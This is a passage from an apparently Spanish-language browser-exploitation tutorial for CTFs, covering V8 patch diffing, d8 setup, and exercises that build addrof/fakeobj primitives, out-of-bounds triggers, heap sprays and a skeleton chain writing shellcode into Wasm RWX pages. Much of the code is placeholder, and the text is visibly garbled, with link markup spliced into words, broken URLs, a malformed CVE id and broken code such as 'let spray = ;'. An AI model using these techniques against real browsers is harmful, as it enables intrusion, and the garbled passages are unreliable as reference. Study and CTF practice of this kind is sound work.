4. **[jit](../raw/br0ws3r-3xpl01t4t10n.md#jit) Challenges:** Bugs específicos en el [[compilador](../raw/pr0gr4mm1ng-f0nd4m3nt0s.md#compiladores)](./raw/pr0gr4mm1ng [jit](../raw/br0ws3r-3xpl01t4t10n.md#jit).
5. **Full Chain (renderer + sandbox escape):** Debes explotar el renderer y escapar del sandbox.

#### 12.1.2. Identificación del Bug

Pasos:
1. **Revisar cambios en el binario:** Si te dan un diff, es más fácil.
2. **[fuzzing](../raw/fuzz1ng.md):** Si es 0-day, puedes fuzzear funciones específicas.
3. **Revisión de código:** Buscar lugares sospechosos.
4. **Trigger development:** Crear pequeño script JS que crashee.

#### 12.1.3. Construcción de Primitivas

Una vez identificado el bug:
1. Analizar qué tipo de bug es (OOB, UAF, type confusion).
2. Construir addrof/fakeobj.
3. Construir arbitrary R/W.
4. Conseguir code execution.

#### 12.1.4. Obtención de la Flag

Finalmente:
1. Ejecutar shellcode para leer la flag.
2. Enviar la flag al servidor vía [reverse shell](../raw/r3v3rs3-sh3lls.md#reverse-shells) o write.
3. Para sandboxed challenges: necesitar escape.

### 12.2. Herramientas para CTF

#### 12.2.1. d8 Parches Custom

A veces el CTF proporciona un d8 modificado. Compilar y usar:

```bash
# Si te dan un parche:
git apply /path/to/patch
ninja -C out/debug d8

# Usar con flags específicos del desafío
d8 --allow-natives-syntax --expose-gc exploit.js
```

#### 12.2.2. [docker](../raw/d0ck3r-f0r-h4ck3rs.md) para Aislar el Entorno

```dockerfile
# Dockerfile para un browser CTF
FROM ubuntu:20.04
RUN apt-get update && apt-get install -y \ libgtk-3-0 libnss3 libasound2 libx11-xcb1 \ libxcb1 libxcomposite1 libxcursor1 libxdamage1 \ libxext6 libxfixes3 libxi6 libxrandr2 libxrender1 \ libxss1 libxtst6
COPY chrome /usr/bin/chrome
COPY flag /flag
EXPOSE 1337
ENTRYPOINT ["/usr/bin/chrome", "--headless"]
```

#### 12.2.3. Scripts de Utilidad

```python
# generate_exploit.py - Helper para CTFs
import struct

def pack64(val): return struct.pack("<Q", val)

def unpack64(data): return struct.unpack("<Q", data)[0]

# Generar HTML para el exploit
with open("exploit.html", "w") as f: f.write("""<html><script> // Exploit code here
</script></html>""")
```

### 12.3. Desafíos Tipo "Patch Diffing"

El escenario típico:
1. Te dan un build de Chromium o d8 con un parche de seguridad aplicado.
2. Debes hacer diff con el binario original (o con commits conocidos).
3. Identificar qué bug se parcheó.
4. Escribir el [exploit](../raw/m3t4spl01t.md#exploits) para la versión vulnerable.

**Estrategia:**
```bash
# 1. Encontrar la versión del build
strings chrome | grep -i "Chrome/"
strings d8 | grep -i "V8 version"

# 2. Comparar con source conocido
# Si es Chromium: buscar en git log
# Si es custom: usar binDiff o Ghidra

# 3. Identificar el área del parche
# Buscar funciones con cambios en el binario
```

### 12.4. Desafíos Tipo "Bug Hunting"

Son más abiertos:
1. No hay parche, solo un build.
2. Debes encontrar una [vulnerabilidad](../raw/s3c-f0nd4m3nt0s.md#vulnerabilidades) "oculta".
3. Puedes usar fuzzing, revisión de código, análisis estático.

**Estrategias:**
- **DOM fuzzing:** Fuzzear APIs del DOM (especialmente las nuevas).
- **Web API fuzzing:** Fuzzear APIs de servicios (WebUSB, WebBluetooth, WebGPU).
- **Protocol fuzzing:** Fuzzear WebSocket, WebRTC, [http](../raw/r3d3s-f0nd4m3nt0s.md#http)/3.

### 12.5. Write-ups Clásicos

#### 12.5.1. Google CTF

Las finales de Google CTF suelen tener challenges de [browser exploitation](../raw/br0ws3r-3xpl01t4t10n.md). Buscar write-ups en:
- ctftime.org
- Google CTF write-ups en Medium/GitHub

#### 12.5.2. Pwn2Own

Pwn2Own es una competición de explotación. Aunque los detalles no siempre se publican:
- ZDI publica advisories técnicos.
- A veces los ganadores publican write-ups.

#### 12.5.3. 0ctf/TCTF

0ctf (ahora TCTF) tiene famosos challenges de browser:
- 0ctf 2019: "browser" ([v8](../raw/br0ws3r-3xpl01t4t10n.md#v8) exploit)
- 0ctf 2020: "chromium" (full chain)

#### 12.5.4. PlaidCTF

PlaidCTF de CMU tiene challenges de browser esporádicamente. Buscar write-ups.

---

## 13. Ejercicios Prácticos

### 13.1. Ejercicio: setup del Entorno d8

#### 13.1.1. Objetivo

Configurar un entorno de desarrollo para browser [exploitation](./raw/br0ws3r con d8, GDB y rr.

#### 13.1.2. Instrucciones Paso a Paso

```bash
# 1. Instalar depot_tools
git clone https://chromium.googlesource.com/chromium/tools/depot_tools.git
export PATH=$PWD/depot_tools:$PATH

# 2. Fetch V8
fetch v8
cd v8

# 3. Compilar d8 debug
gn gen out/debug --args='is_debug=true v8_enable_sandbox=false'
ninja -C out/debug d8

# 4. Verificar
out/debug/d8 -e 'print("Hello, Browser Exploitation!")'

# 5. Configurar GDB
# Crear ~/.gdbinit con:
# source /path/to/v8/tools/gdb/v8init.py
```

#### 13.1.3. Verificación

```bash
# Crear test.js:
let obj = { x: 1, y: 2 };
print(%DebugPrint(obj);

# Ejecutar:
out/debug/d8 --allow-natives-syntax test.js
# Debería mostrar información detallada del objeto
```

### 13.2. Ejercicio: Análisis de Bytecode

#### 13.2.1. Objetivo

Entender cómo Ignition traduce JavaScript a bytecode.

#### 13.2.2. Código a Analizar

```javascript
// Crear funciones con diferentes patrones
function simple(a, b) { return a + b;
}

function with_object(obj) { return obj.x + obj.y;
}

function with_array(arr, idx) { return arr[idx];
}

// Ejecutar y ver bytecode
simple(1, 2);
simple(3, 4);  // Calentar

with_object({ x: 1, y: 2 });
with_array([1, 2, 3], 1);
```

#### 13.2.3. Preguntas

1. ¿Qué bytecodes se generan para `simple`?
2. ¿Cuántos registros virtuales usa `with_object`?
3. ¿Qué diferencias hay entre el bytecode de un acceso a propiedad y un acceso a array?
4. ¿Aparecen IC slots en el bytecode?

```bash
# Correr:
d8 --print-bytecode exercise.js
```

### 13.3. Ejercicio: Type Confusion con Map Transitions

#### 13.3.1. Objetivo

Entender cómo las transiciones de Map pueden llevar a type confusion.

#### 13.3.2. Código de Ejemplo

```javascript
function createPoint(x, y) { return { x: x, y: y };
}

let p1 = createPoint(1, 2);  // Map M1
let p2 = createPoint(3, 4);  // Map M1 (mismo)
let p3 = createPoint(1.5, 2.5);  // Map M2 (diferente, propiedades son doubles)

// Las transiciones de Map dependen del tipo de propiedades
%DebugPrint(p1);
%DebugPrint(p3);
```

#### 13.3.3. Preguntas

1. ¿Por qué p1 y p2 comparten Map pero p3 no?
2. ¿Qué pasaría si agregamos una propiedad a p1 después de crearlo? (ej: p1.z = 5)
3. ¿Cómo afecta el ElementsKind a la transición de Map?

### 13.4. Ejercicio: Construcción de addrof/fakeobj

#### 13.4.1. Objetivo

Implementar addrof y fakeobj usando OOB en un array.

#### 13.4.2. Implementación Guiada

```javascript
// Helper para convertir entre float64 y bigint
function ftoi(f) { let buf = new ArrayBuffer(8); let f64 = new Float64Array(buf); let u64 = new BigUint64Array(buf); f64[0] = f; return u64[0];
}

function itof(i) { let buf = new ArrayBuffer(8); let f64 = new Float64Array(buf); let u64 = new BigUint64Array(buf); u64[0] = i; return f64[0];
}

// Asumiendo que tenemos OOB desde un array:
function addrof(obj, oob_arr) { // Colocar obj al lado del oob_arr en el heap // Luego leer desde oob_arr // EJERCICIO: Implementar addrof // Hint: Usar el truco de colocar obj en un array de objetos // y leer sus punteros con OOB return BigInt(0);  // Placeholder
}

function fakeobj(addr, oob_arr) { // EJERCICIO: Implementar fakeobj // Hint: Escribir addr en el heap y luego interpretarlo como objeto return null;  // Placeholder
}

// Probar
let test_arr = [1.1, 2.2, 3.3, 4.4];
let target = { x: 42 };

// TODO: Obtener OOB en test_arr
// let leaked_addr = addrof(target, test_arr);
// print("Address of target: 0x" + leaked_addr.toString(16);
```

#### 13.4.3. Verificación

La salida esperada (dependiendo de la versión de [v8](../raw/br0ws3r-3xpl01t4t10n.md#v8) y ASLR):
```
Address of target: 0x3fc012345678
fakeobj test: [object Object]
```

### 13.5. Ejercicio: Análisis de Patch Diffing ([cve](../raw/s3c-f0nd4m3nt0s.md#cve)-2020-6418)

#### 13.5.1. Objetivo

Analizar el parche de CVE-2020-6418 y entender cómo explotarlo.

#### 13.5.2. Material

```bash
# Clonar V8 y navegar al commit del fix
git log --oneline --all | grep -i "6418"
# O buscar "fix type confusion simplify string" en git log
```

#### 13.5.3. Preguntas

1. ¿Qué archivos se modificaron en el fix?
2. ¿Cuál era la función vulnerable?
3. ¿Qué tipo de transformación incorrecta hacía TurboFan?
4. ¿Cómo se podía triggerear el type confusion?
5. Escribir un trigger mínimo.

### 13.6. Ejercicio: Trigger de OOB

#### 13.6.1. Objetivo

Crear un script que provoque OOB en V8 usando un bug de TurboFan.

#### 13.6.2. Implementación

```javascript
// Bug simulado (no es un CVE real, es un ejemplo educativo):

// La función calentada que va a TurboFan
function vulnerable(arr, i, j) { // El cálculo matemático debería asegurar i * 2 < arr.length // Pero con ciertos valores.. no let idx = Math.min(i, j) * 2; return arr[idx];
}

// Array objetivo
let target = [1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8];

// Calentar la función con valores seguros
for (let k = 0; k < 100000; k++) { vulnerable(target, k % 4, (k + 1) % 4);
}

// Ahora con valores maliciosos
// EJERCICIO: Encontrar valores de i, j que hagan idx > target.length
let leaked = vulnerable(target, 100, 0);
print("Leaked: " + leaked);
```

### 13.7. Ejercicio: [exploit](../raw/m3t4spl01t.md#exploits) Chain Completa

#### 13.7.1. Objetivo

Construir una cadena de explotación completa:
1. OOB → addrof/fakeobj
2. fakeobj → arbitrary R/W
3. arbitrary R/W → code execution (Wasm RWX)

#### 13.7.2. Componentes

```javascript
// Paso 1: Obtener OOB
// (usar el ejercicio anterior)

// Paso 2: addrof
function addrof(obj) { /* .. */ }

// Paso 3: fakeobj
function fakeobj(addr) { /* .. */ }

// Paso 4: Construir arbitrary R/W
let arb = { read64(addr) { /* .. */ }, write64(addr, value) { /* .. */ }
};

// Paso 5: Obtener shellcode execution
// Usar Wasm RWX o JIT code overwrite
let shellcode = [ 0x90909090, 0x90909090,  // NOP sled // .. shellcode real
];

// Escribir en página RWX
for (let i = 0; i < shellcode.length; i++) { arb.write32(wasm_rwx_addr + i * 4, shellcode[i]);
}

// Ejecutar
wasm_func;
```

#### 13.7.3. Integración

Escribir el exploit completo en un solo archivo HTML/JS que:
1. Crea el trigger OOB.
2. Obtiene addrof/fakeobj.
3. Construye arbitrary R/W.
4. Obtiene code execution.
5. Ejecuta comando (calc.exe, /bin/sh, etc.) o lee flag.

---

## 14. Referencias y Recursos

### 14.1. Documentación Oficial

- **[v8](../raw/br0ws3r-3xpl01t4t10n.md#v8) Design Docs:** httpss)://[v8](../raw/br0ws3r-3xpl01t4t10n.md#v8).dev/docs
- **Chromium Security:** [https](../raw/r3d3s-f0nd4m3nt0s.md#https)://chromium.org/Home/chromium-security
- **Mojo Documentation:** https://chromium.googlesource.[com](../raw/w1n-s9bsyst3ms.md#com)/chromium/src/+/HEad/mojo/README.md
- **Blink Engine:** https://www.chromium.org/blink/

### 14.2. Blogs de Seguridad

- **Google Project Zero:** https://googleprojectzero.blogspot.com/
- **Saelo (Phrack):** https://www.phrack.org/
- **Rhino Security Labs:** https://rhinosecuritylabs.com/
- **Ret2 Systems:** https://blog.ret2.io/
- **0x434b (Telegram/Blog):** Varios write-ups de V8
- **maxpl0it:** https://maxpl0it.github.io/

### 14.3. Papers Académicos

- "SoK: All You Ever Wanted to Know About [x86](../raw/4ss3mbly-f0r-h4ck3rs.md#x86)/[x64](../raw/4ss3mbly-f0r-h4ck3rs.md#x64) Binary Disassembly but Were Afraid to Ask"
- "[jit](../raw/br0ws3r-3xpl01t4t10n.md#jit) Spraying: A Novel Attack Against Just-in-Time Compilers"
- "Speculative Optimizations: A New Attack Vector in Web Browsers"
- "V8: JavaScript Engine for the Chromium Project"

### 14.4. Repositorios de exploits

- **Awesome [browser exploitation](../raw/br0ws3r-3xpl01t4t10n.md):** https://github.com/connor-brooks/awesome-browser-exploitation
- **V8 Exploits (GitHub):** Varios repos con PoCs
- **[exploit](../raw/m3t4spl01t.md#exploits) Database:** https://www.[exploit](../raw/m3t4spl01t.md#exploits)-db.com/
- **ZDI Advisories:** https://www.zerodayinitiative.com/advisories/

### 14.5. Comunidades

- **r/V8Exploit:** [subred](../raw/r3d3s-f0nd4m3nt0s.md#subredes))dit (pequeño pero activo)
- **Discord de Browser Exploitation:** Invitaciones en Twitter
- **IRC #v8 en Freenode/Libera Chat:** ([legacy](../raw/l3g4cy-3nt3rpr1s3.md))
- **Grupo de Telegram "Browser Exploitation":** Comunidad activa en español e inglés

---

> **Disclaimer:** Este tutorial es con fines educativos. La explotación de navegadores debe practicarse solo en entornos autorizados. No uses estas técnicas contra sistemas que no te pertenecen o sin permiso explícito. En Argentina, la Ley 26.904 penaliza el acceso ilegítimo a sistemas informáticos. ## 14.1. Bonus Content - advanced v8 Debugging Tipss)

When debugging V8 exploits, there are several advanced techniques that can save hours of work:

### 14.1.1. Using rr with Conditional Reverse-Continue

Instead of manually stepping through thousands of jit-compiled instructions, use conditional reverse-continue:

```bash
# Record with rr
rr record d8 --allow-natives-syntax exploit.js

# Replay and set breakpoint at crash
rr replay
(gdb) set exec-direction reverse
(gdb) watch *0x7f..  # Watch for corruption at specific address
(gdb) continue
```

### 14.1.2. V8 Memory Inspection with GDB

The `job` macro in V8's GDB init file is invaluable. Combined with pointer compression awareness:

```gdb
# In V8 with pointer compression
# The cage base is in gs segment register on x64
(gdb) p/x $gs_base
# Convert compressed pointer: offset = compressed & 0xFFFFFFFF
# Absolute = cage_base + offset
```

### 14.1.3. Analyzing TurboFan Graphs

Export TurboFan graphs for visual analysis:

```bash
d8 --trace-turbo --trace-turbo-path=./turbo exploit.js
# This generates JSON files of the Sea of Nodes graph
# View with: https://v8.github.io/tools/head/turbolizer/
```

### 14.1.4. Heap Layout Manipulation

For reliable exploitation, you need to control heap layout:

```javascript
// Spray objects to control heap adjacency
function heapSpray(count, factory) { let spray = ; for (let i = 0; i < count; i++) { spray.push(factory); } return spray;
}

// GC to consolidate
gc;
gc;

// Now allocate target after spray
let target = {};
// With careful sizing, target lands right after spray elements
```

### 14.1.5. Debugging Wasm JIT Pages

To find Wasm RWX page addresses:

```javascript
// In older V8 before W^X
let module = new WebAssembly.Module(..);
let instance = new WebAssembly.Instance(module);
let func = instance.exports.main;

// Use addrof + type confusion to find the code pointer
// Then verify it's in an RWX region
```

---

## 15. Practica con Desafios Reales

### 15.1. Desafio: Starctf 2021 - [v8](../raw/br0ws3r-3xpl01t4t10n.md#v8)

Este desafio involucraba un bug de type confusion en TurboFan. El trigger minimo:

```javascript
function trigger(arr, i) { // Feedback: arr siempre es array de floats // TurboFan elimina bounds check return arr[i];
}
```

### 15.2. Desafio: Google [ctf](../raw/ctf-h4ckth3b0x.md) 2020 - V8

Un bug de Simplified Lowering similar a cvec-2020-16040. Requeria entender como TurboFan maneja las conversiones de tipos entre Smi y Number.

### 15.3. Desafio: Pwn2Own 2021 - Full Chain

Una cadena completa incluyendo renderer [exploit](../raw/m3t4spl01t.md#exploits) + sandbox escape via Mojo interface abuse.

---

## 16. Glosario de Terminos

| Termino | Definicion |
|---------|-----------|
| addrof | Primitiva que devuelve la direccion de un objeto en el heap |
| fakeobj | Primitiva que crea un objeto falso en una direccion arbitraria |
| OOB | Out-of-Bounds: acceso mas alla de los limites de un array |
| UAF | Use-After-Free: acceso a memoria liberada |
| W^X | Write XOR Execute: politica de seguridad de memoria |
| IC | Inline Cache: mecanismo de optimizacion de [v8](../raw/br0ws3r-3xpl01t4t10n.md#v8) |
| Map | Hidden Class / Meta-object que describe la estructura de un objeto |
| Smi | Small Integer: entero de 31 bits con tagged pointer |


